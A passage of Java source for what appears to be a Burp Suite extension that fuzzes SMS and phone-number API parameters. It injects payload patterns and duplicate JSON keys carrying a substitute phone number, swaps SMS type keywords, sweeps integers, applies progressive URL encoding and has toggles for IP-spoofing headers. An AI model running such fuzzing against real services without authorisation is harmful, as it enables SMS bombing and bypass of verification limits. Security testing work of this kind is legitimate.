                    payload = payload.replace("18888888888", customPhoneNumber);
                }
                Object newRoot = setByPath(cloneJson(root), path, payload);
                sendJsonTest(newRoot.toString(), paramLabel, payload,
                        baseRequestResponse, headers, origEntry);
            }
            // 1b. 组合测试：保留外层结构，只在目标 key 处构造重复 key
            if (combineTestEnabled && !path.isEmpty() && path.get(path.size() - 1) instanceof String) {
                for (int pi = 0; pi < PAYLOAD_PATTERNS.length; pi++) {
                    if (cancelFlags.get(origEntry.id).get()) break;
                    if (!isPatternEnabled(pi)) continue;
                    String pattern = PAYLOAD_PATTERNS[pi];
                    String payload = pattern.replace("xxxxxxxxxxx", str);
                    if (payload.contains("18888888888")) {
                        payload = payload.replace("18888888888", customPhoneNumber);
                    }
                    String dupBody = buildJsonWithDuplicateKeyAtPath(root, path, payload, customPhoneNumber);
                    sendJsonTest(dupBody, paramLabel + "_combo",
                            payload + " + dup:" + customPhoneNumber,
                            baseRequestResponse, headers, origEntry);
                }
            }
            // 1c. 渐进 URL 编码：与 IParameter 路径一致，从第一位开始对前 N 位字符做百分号编码
            // JSON body 不会被 Burp 解析为 IParameter，所以 IParameter 那段 URL 编码代码不会执行；这里给 JSON 路径补上
            if (urlEncodeTestEnabled) {
                for (int i = 1; i <= str.length(); i++) {
                    if (cancelFlags.get(origEntry.id).get()) break;
                    String prefix = str.substring(0, i);
                    String newPhone = alwaysUrlEncode(prefix) + str.substring(i);
                    Object newRoot = setByPath(cloneJson(root), path, newPhone);
                    sendJsonTest(newRoot.toString(), paramLabel + "_urlencode", newPhone,
                            baseRequestResponse, headers, origEntry);
                }
            }
        }

        // 2. SMS 关键字替换
        if (smsInterfaceTestEnabled && isSmsKeyword(str)) {
            executed = true;
            String[] keywords = {"register", "reg", "regist", "login", "recall", "retrieve", "ret", "true", "false"};
            for (String kw : keywords) {
                if (!kw.equalsIgnoreCase(str)) {
                    Object newRoot = setByPath(cloneJson(root), path, kw);
                    sendJsonTest(newRoot.toString(), paramLabel + "_sms", kw,
                            baseRequestResponse, headers, origEntry);
                }
            }
        }

        // 3. 整数替换 [-100, 100]，排除 86
        if (smsInterfaceTestEnabled && isInteger(str) && isInRange(str)) {
            executed = true;
            int origInt = Integer.parseInt(str);
            for (int i = -100; i <= 100; i++) {
                if (i != origInt) {
                    Object newRoot = setByPath(cloneJson(root), path, String.valueOf(i));
                    sendJsonTest(newRoot.toString(), paramLabel + "_int", String.valueOf(i),
                            baseRequestResponse, headers, origEntry);
                }
            }
        }
        return executed;
    }

    /**
     * 实际发送 JSON 测试请求并记录日志。把原本散落在 processJsonAndTest 各处的
     * makeHttpRequest + saveBuffersToTempFiles + TestLogEntry + invokeLater 八股集中到一处。
     */
    private void sendJsonTest(String body, String paramLabel, String payloadLabel,
                              IHttpRequestResponse baseRequestResponse,
                              List<String> headers, OriginalLogEntry origEntry) {
        byte[] bodyBytes = body.getBytes(StandardCharsets.UTF_8);
        byte[] newRequest = helpers.buildHttpMessage(headers, bodyBytes);
        IHttpRequestResponse testResponse = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), newRequest);
        int responseLength = (testResponse.getResponse() != null)
                ? testResponse.getResponse().length : 0;
        int responseCode = (testResponse.getResponse() != null)
                ? helpers.analyzeResponse(testResponse.getResponse()).getStatusCode() : 0;
        IHttpRequestResponsePersisted persistedTest = callbacks.saveBuffersToTempFiles(testResponse);
        TestLogEntry testEntry = new TestLogEntry(testCounter++, origEntry.id,
                paramLabel, payloadLabel, responseLength, 0, responseCode, persistedTest);
        testLog.add(testEntry);
        SwingUtilities.invokeLater(() -> {
            ResultTableModel model = (ResultTableModel) resultTable.getModel();
            if (selectedOriginalId == origEntry.id) {
                model.setFilter(origEntry.id);
                int rowCount = resultTable.getRowCount();
                if (rowCount > 0) {
                    resultTable.scrollRectToVisible(resultTable.getCellRect(rowCount - 1, 0, true));
                }
            }
        });
    }

    /**
     * 深拷贝 JSON 节点（JSONObject / JSONArray）。基本类型直接返回。
     * 用于在每次写入前从 root 拷贝一份，避免互相污染。
     */
    private Object cloneJson(Object node) {
        if (node instanceof JSONObject) {
            return new JSONObject(node.toString());
        } else if (node instanceof JSONArray) {
            return new JSONArray(node.toString());
        }
        return node;
    }

    /**
     * 按路径在 root（必须是 JSONObject / JSONArray）上写入 newValue，返回 root。
     * path 元素为 String（对象 key）或 Integer（数组下标）。
     */
    private Object setByPath(Object root, List<Object> path, Object newValue) {
        if (path.isEmpty()) return root;
        Object cursor = root;
        for (int i = 0; i < path.size() - 1; i++) {
            Object step = path.get(i);
            if (cursor instanceof JSONObject && step instanceof String) {
                cursor = ((JSONObject) cursor).get((String) step);
            } else if (cursor instanceof JSONArray && step instanceof Integer) {
                cursor = ((JSONArray) cursor).get((Integer) step);
            } else {
                return root; // 路径不匹配，不修改
            }
        }
        Object last = path.get(path.size() - 1);
        if (cursor instanceof JSONObject && last instanceof String) {
            ((JSONObject) cursor).put((String) last, newValue);
        } else if (cursor instanceof JSONArray && last instanceof Integer) {
            ((JSONArray) cursor).put((Integer) last, newValue);
        }
        return root;
    }

    /**
     * 在嵌套 JSON 中，按 path 定位到目标 key 所在的对象，构造一个保留全部外层结构、
     * 仅在目标对象内将目标 key 重复出现两次（payload + dupValue）的 JSON 字符串。
     * path 最后一项必须是 String（对象 key），否则原样返回 root.toString()。
     */
    private String buildJsonWithDuplicateKeyAtPath(Object root, List<Object> path,
                                                   String payload, String dupValue) {
        if (path.isEmpty() || !(path.get(path.size() - 1) instanceof String)) {
            return root.toString();
        }
        String targetKey = (String) path.get(path.size() - 1);
        // 父路径
        List<Object> parentPath = path.subList(0, path.size() - 1);
        // 序列化时遇到 parentPath 指向的 JSONObject，就在它内部对 targetKey 写两次
        return serializeWithDuplicate(root, new ArrayList<>(), parentPath, targetKey, payload, dupValue);
    }

    /**
     * 递归序列化 JSON。当当前节点的路径等于 parentPath 且节点是 JSONObject 时，
     * 在序列化它时把 targetKey 输出两次：第一次值为 payload，第二次值为 dupValue。
     */
    private String serializeWithDuplicate(Object node, List<Object> currentPath,
                                          List<Object> parentPath, String targetKey,
                                          String payload, String dupValue) {
        if (node instanceof JSONObject) {
            JSONObject obj = (JSONObject) node;
            boolean isTargetParent = currentPath.equals(parentPath) && obj.has(targetKey);
            StringBuilder sb = new StringBuilder("{");
            boolean first = true;
            for (String k : obj.keySet()) {
                if (!first) sb.append(",");
                first = false;
                Object v = obj.get(k);
                if (isTargetParent && k.equals(targetKey)) {
                    // 重复 key：第一次 payload，第二次 dupValue
                    sb.append(quote(k)).append(":").append(quote(payload));
                    sb.append(",").append(quote(k)).append(":").append(quote(dupValue));
                } else {
                    sb.append(quote(k)).append(":");
                    List<Object> childPath = new ArrayList<>(currentPath);
                    childPath.add(k);
                    sb.append(serializeWithDuplicate(v, childPath, parentPath, targetKey, payload, dupValue));
                }
            }
            sb.append("}");
            return sb.toString();
        } else if (node instanceof JSONArray) {
            JSONArray arr = (JSONArray) node;
            StringBuilder sb = new StringBuilder("[");
            for (int i = 0; i < arr.length(); i++) {
                if (i > 0) sb.append(",");
                List<Object> childPath = new ArrayList<>(currentPath);
                childPath.add(i);
                sb.append(serializeWithDuplicate(arr.get(i), childPath, parentPath, targetKey, payload, dupValue));
            }
            sb.append("]");
            return sb.toString();
        } else if (node instanceof String) {
            return quote((String) node);
        } else if (node == null || JSONObject.NULL.equals(node)) {
            return "null";
        } else {
            return node.toString();
        }
    }

    /**
     * 将字符串包装为 JSON 字符串字面量（含双引号、转义）。借用 org.json 的内置实现。
     */
    private String quote(String s) {
        return JSONObject.quote(s);
    }

    // 简单判断：如果请求体以 { 开头则解析为JSONObject，否则若以 [ 开头则解析为JSONArray
    private Object parseJson(String body) throws JSONException {
        body = body.trim();
        if (body.startsWith("{"))
            return new JSONObject(body);
        else if (body.startsWith("["))
            return new JSONArray(body);
        else
            throw new JSONException("不是有效的JSON格式");
    }

    // 辅助方法：判断字符串是否为短信接口关键字
    private boolean isSmsKeyword(String value) {
        String[] keywords = {"register", "reg", "regist", "login", "recall", "retrieve", "ret", "true", "false"};
        for (String kw : keywords) {
            if (value.equalsIgnoreCase(kw)) {
                return true;
            }
        }
        return false;
    }

    // 辅助方法：判断是否为整数
    private boolean isInteger(String value) {
        try {
            Integer.parseInt(value);
            return true;
        } catch (NumberFormatException ex) {
            return false;
        }
    }

    // 辅助方法：判断整数是否在-100到100之间
    private boolean isInRange(String value) {
        try {
            int num = Integer.parseInt(value);
            return (num >= -100 && num <= 100 && num != 86);
        } catch(Exception ex) {
            return false;
        }
    }

    /**
     * 构造一个外观与 JLabel 等价、但允许鼠标选中并复制的"伪标签"。
     * 实现：使用只读 JTextField (editable=false 但 enabled=true)，去掉边框/背景，沿用 Label 字体与前景色。
     * - editable=false 阻止用户改文本，但仍允许选中/复制；setEnabled(false) 会禁用选中，所以不用它
     * - 鼠标光标设为文本光标（I-beam），提示用户可选
     * - 加一个右键菜单"复制"，因为只读时默认 popup 没有"复制"项
     */
    private JTextField selectableLabel(String text) {
        JTextField tf = new JTextField(text);
        tf.setEditable(false);
        tf.setBorder(null);
        tf.setOpaque(false);
        tf.setBackground(null);
        Color labelFg = UIManager.getColor("Label.foreground");
        if (labelFg != null) tf.setForeground(labelFg);
        Font labelFont = UIManager.getFont("Label.font");
        if (labelFont != null) tf.setFont(labelFont);
        tf.setCursor(Cursor.getPredefinedCursor(Cursor.TEXT_CURSOR));
        // 隐藏 caret，避免点击后出现闪烁竖线
        tf.setCaretColor(new Color(0, 0, 0, 0));

        JPopupMenu popup = new JPopupMenu();
        JMenuItem copyItem = new JMenuItem("复制");
        copyItem.addActionListener(e -> {
            String sel = tf.getSelectedText();
            // 没框选时复制整行（与多数 IDE 行为一致）
            String toCopy = (sel == null || sel.isEmpty()) ? tf.getText() : sel;
            tf.getToolkit().getSystemClipboard().setContents(
                    new java.awt.datatransfer.StringSelection(toCopy), null);
        });
        popup.add(copyItem);
        tf.setComponentPopupMenu(popup);
        return tf;
    }

    // 辅助方法：对字符串中每个字符都进行 URL 编码
    private String alwaysUrlEncode(String s) {
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            sb.append(String.format("%%%02X", (int) c));
        }
        return sb.toString();
    }

    /**
     * 弹出 Payload 类别选择对话框：8 个 PayloadCategory + 4 个独立测试开关。
     * 用户点确定后，整体替换 enabledPayloadCategories 与 4 个布尔开关。
     * 取消则不改变现有设置。
     */
    private void showPayloadCategoryDialog() {
        JPanel panel = new JPanel();
        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));

        // 收集所有复选框引用，便于全选/全不选统一切换
        Map<PayloadCategory, JCheckBox> catBoxes = new LinkedHashMap<>();
        JCheckBox urlEncodeBox = new JCheckBox("渐进 URL 编码", urlEncodeTestEnabled);
        JCheckBox postExtBox = new JCheckBox("POST 路径追加静态后缀", postExtTestEnabled);
        JCheckBox extraHeadersBox = new JCheckBox("IP 伪造头注入", extraHeadersTestEnabled);
        // 短信接口测试：SMS 关键字替换 + 整数 [-100,100] 替换；从原"测试短信接口"按钮迁移过来
        JCheckBox smsInterfaceBox = new JCheckBox("短信接口测试（type）", smsInterfaceTestEnabled);

        // 顶部：全选 / 全不选 按钮（左对齐）
        JPanel toggleRow = new JPanel(new FlowLayout(FlowLayout.LEFT, 4, 0));
        toggleRow.setAlignmentX(Component.LEFT_ALIGNMENT);
        JButton selectAllBtn = new JButton("全选");
        JButton selectNoneBtn = new JButton("全不选");
        selectAllBtn.addActionListener(ev -> {
            for (JCheckBox cb : catBoxes.values()) cb.setSelected(true);
            urlEncodeBox.setSelected(true);
            postExtBox.setSelected(true);
            extraHeadersBox.setSelected(true);
            smsInterfaceBox.setSelected(true);
        });
        selectNoneBtn.addActionListener(ev -> {
            for (JCheckBox cb : catBoxes.values()) cb.setSelected(false);
            urlEncodeBox.setSelected(false);
            postExtBox.setSelected(false);
            extraHeadersBox.setSelected(false);
            smsInterfaceBox.setSelected(false);
        });
        toggleRow.add(selectAllBtn);
        toggleRow.add(selectNoneBtn);
        panel.add(toggleRow);
        panel.add(Box.createVerticalStrut(6));

        panel.add(new JLabel("测试类别（号码值替换）："));
        for (PayloadCategory cat : PayloadCategory.values()) {
            JCheckBox cb = new JCheckBox(cat.label, enabledPayloadCategories.contains(cat));
            catBoxes.put(cat, cb);
            panel.add(cb);
        }

        panel.add(Box.createVerticalStrut(8));
        panel.add(new JLabel("其他测试类型："));
        panel.add(urlEncodeBox);
        panel.add(postExtBox);
        panel.add(extraHeadersBox);
        panel.add(smsInterfaceBox);

        int ret = JOptionPane.showConfirmDialog(
                null, new JScrollPane(panel),
                "选择启用的测试类型",
                JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);
        if (ret != JOptionPane.OK_OPTION) return;

        enabledPayloadCategories.clear();
        for (Map.Entry<PayloadCategory, JCheckBox> e : catBoxes.entrySet()) {
            if (e.getValue().isSelected()) enabledPayloadCategories.add(e.getKey());
        }
        urlEncodeTestEnabled = urlEncodeBox.isSelected();
        postExtTestEnabled = postExtBox.isSelected();
        extraHeadersTestEnabled = extraHeadersBox.isSelected();
        smsInterfaceTestEnabled = smsInterfaceBox.isSelected();

        callbacks.printOutput("测试类别更新：启用 " + enabledPayloadCategories
                + "; URL编码=" + urlEncodeTestEnabled
                + "; POST后缀=" + postExtTestEnabled
                + "; IP头=" + extraHeadersTestEnabled
                + "; 短信接口=" + smsInterfaceTestEnabled);
    }

    /**
     * 当前 pattern 对应的类别是否被启用。
     */
    private boolean isPatternEnabled(int patternIndex) {
        PayloadCategory cat = PAYLOAD_CATEGORIES[patternIndex];
        return cat != null && enabledPayloadCategories.contains(cat);
    }

    /**
     * 弹出对话框，多选候选手机号
     */
    private List<String> showPhoneSelectionDialog(List<String> candidates) {
        JList<String> list = new JList<>(candidates.toArray(new String[0]));
        list.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
        JScrollPane scroll = new JScrollPane(list);
        int ret = JOptionPane.showConfirmDialog(
                null, scroll, "选择要 Fuzz 的手机号", JOptionPane.OK_CANCEL_OPTION);
        if (ret == JOptionPane.OK_OPTION) {
            return list.getSelectedValuesList();
        }
        return Collections.emptyList();
    }



    // 根据当前选中的原始请求id，返回对应的测试日志列表
    private List<TestLogEntry> getFilteredTestLog() {
        List<TestLogEntry> filtered = new ArrayList<>();
        for (TestLogEntry entry : testLog) {
            if (entry.originalId == selectedOriginalId) {
                filtered.add(entry);
            }
        }
        return filtered;
    }

    /**
     * 删除原始请求表中当前选中的若干行（级联删除其下所有测试结果）：
     * 1. 收集选中行对应的 OriginalLogEntry.id
     * 2. 对仍在"测试中..."的条目，设置 cancelFlag = true，fuzz 工作线程下次循环检查时会停下
     * 3. 从 testLog 中删除所有 originalId 在该集合中的条目
     * 4. 从 originalLog 中删除被选中的条目，并清理 cancelFlags 中对应的 entry
     * 5. 如果当前 selectedOriginalId 被删，重置过滤并清空查看器
     */
    private void deleteSelectedOriginalRows() {
        int[] viewRows = originalTable.getSelectedRows();
        if (viewRows.length == 0) return;

        // originalTable 没有装 RowSorter，视图行号 == 模型行号；保险起见仍走转换
        Set<Integer> idsToRemove = new HashSet<>();
        Set<Integer> rowsToRemove = new TreeSet<>();
        for (int vr : viewRows) {
            int mr = originalTable.convertRowIndexToModel(vr);
            if (mr >= 0 && mr < originalLog.size()) {
                rowsToRemove.add(mr);
                idsToRemove.add(originalLog.get(mr).id);
            }
        }
        if (idsToRemove.isEmpty()) return;

        // 给仍在测试的条目发取消信号；fuzz 线程下次进入循环顶部时会检测到并 break
        for (Integer id : idsToRemove) {
            AtomicBoolean flag = cancelFlags.get(id);
            if (flag != null) flag.set(true);
        }

        // 级联清理
        testLog.removeIf(e -> idsToRemove.contains(e.originalId));
        // 倒序删除 originalLog（TreeSet 默认升序，descendingIterator 拿到降序）
        for (Iterator<Integer> it = ((TreeSet<Integer>) rowsToRemove).descendingIterator(); it.hasNext(); ) {
            originalLog.remove((int) it.next());
        }
        for (Integer id : idsToRemove) {
            cancelFlags.remove(id);
        }

        // 清除选区，避免 fireTableDataChanged 触发选择监听器读到错位行
        originalTable.clearSelection();
        fireTableDataChanged();

        // 如果当前查看器显示的是被删的某条原始/测试，重置
        if (idsToRemove.contains(selectedOriginalId)) {
            selectedOriginalId = -1;
            ((ResultTableModel) resultTable.getModel()).setFilter(-1);
            requestViewer.setMessage(new byte[0], true);
            responseViewer.setMessage(new byte[0], false);
            currentlyDisplayedItem = null;
        }
    }

    /**
     * 删除测试结果表中当前选中的若干行：
     * 1. 拿视图行号 → 转模型行号 → 取 TestLogEntry.id 形成稳定键集合
     * 2. 从全量 testLog 中按 id 删除
     * 3. 触发 ResultTableModel 重建当前过滤；若查看器正在显示被删条目，清空查看器
     */
    private void deleteSelectedTestRows() {
        int[] viewRows = resultTable.getSelectedRows();
        if (viewRows.length == 0) return;

        ResultTableModel model = (ResultTableModel) resultTable.getModel();
        Set<Integer> idsToRemove = new HashSet<>();
        IHttpRequestResponsePersisted displayed = null;
        for (int vr : viewRows) {
            int mr = resultTable.convertRowIndexToModel(vr);
            if (mr >= 0 && mr < model.filtered.size()) {
                TestLogEntry entry = model.filtered.get(mr);
                idsToRemove.add(entry.id);
                if (currentlyDisplayedItem == entry.requestResponse) {
                    displayed = entry.requestResponse;
                }
            }
        }
        if (idsToRemove.isEmpty()) return;

        testLog.removeIf(e -> idsToRemove.contains(e.id));
        // 清除选区，避免 fireTableDataChanged 后选中残留行触发监听器报错
        resultTable.clearSelection();
        model.setFilter(selectedOriginalId);

        // 如果查看器正在显示被删除的条目，清空它
        if (displayed != null && currentlyDisplayedItem == displayed) {
            requestViewer.setMessage(new byte[0], true);
            responseViewer.setMessage(new byte[0], false);
            currentlyDisplayedItem = null;
        }
    }

    // --- 以下为表格模型实现（原始请求表格由当前类继承 AbstractTableModel） ---
    @Override
    public int getRowCount() {
        return originalLog.size();
    }

    @Override
    public int getColumnCount() {
        return 4;
    }

    @Override
    public String getColumnName(int columnIndex) {
        switch (columnIndex) {
            case 0: return "#";
            case 1: return "URL";
            case 2: return "状态";
            case 3: return "操作";
            default: return "";
        }
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex) {
        OriginalLogEntry e = originalLog.get(rowIndex);
        switch (columnIndex) {
            case 0: return e.id;
            case 1: return e.url.toString();
            case 2: return e.state;
            case 3:
                // 只有状态为“测试中...”时才在单元格显示按钮文本
                return e.state.startsWith("测试中") ? "停止" : null;
            default: return "";
        }
    }

    // 让第3列“操作”可编辑
    @Override
    public boolean isCellEditable(int rowIndex, int columnIndex) {
        return columnIndex == 3;
    }

    // --- 内部类：原始请求日志实体 ---
    private static class OriginalLogEntry {
        int id;
        int tool;
        IHttpRequestResponsePersisted requestResponse;
        URL url;
        String state;

        OriginalLogEntry(int id, IHttpService service, URL url, IHttpRequestResponsePersisted reqResp, String state) {
            this.id = id;
            this.tool = service.getPort();
            this.url = url;
            this.requestResponse = reqResp;
            this.state = state;
        }
    }

    // --- 内部类：测试日志实体 ---
    private static class TestLogEntry {
        int id;
        int originalId;
        String parameter;
        String payload;
        int responseLength;
        int responseTime;
        int responseCode;
        IHttpRequestResponsePersisted requestResponse;

        TestLogEntry(int id, int originalId, String parameter, String payload, int responseLength, int responseTime, int responseCode, IHttpRequestResponsePersisted reqResp) {
            this.id = id;
            this.originalId = originalId;
            this.parameter = parameter;
            this.payload = payload;
            this.responseLength = responseLength;
            this.responseTime = responseTime;
            this.responseCode = responseCode;
            this.requestResponse = reqResp;
        }
    }

    // --- 内部类：测试结果表格模型 ---
    private class ResultTableModel extends AbstractTableModel {
        // 包级可见，便于外部类（BurpExtender）在删除选中行时按模型行号取条目
        List<TestLogEntry> filtered = new ArrayList<>();

        public void setFilter(int originalId) {
            filtered.clear();
            for (TestLogEntry entry : testLog) {
                if (entry.originalId == originalId) {
                    filtered.add(entry);
                }
            }
            fireTableDataChanged();
        }

        @Override
        public int getRowCount() {
            return filtered.size();
        }

        @Override
        public int getColumnCount() {
            return 5;
        }

        @Override
        public String getColumnName(int columnIndex) {
            switch (columnIndex) {
                case 0:
                    return "参数";
                case 1:
                    return "Payload";
                case 2:
                    return "响应长度";
                case 3:
                    return "耗时(ms)";
                case 4:
                    return "响应码";
                default:
                    return "";
            }
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            TestLogEntry entry = filtered.get(rowIndex);
            switch (columnIndex) {
                case 0:
                    return entry.parameter;
                case 1:
                    return entry.payload;
                case 2:
                    return entry.responseLength;
                case 3:
                    return entry.responseTime;
                case 4:
                    return entry.responseCode;
                default:
                    return "";
            }
        }
    }
}
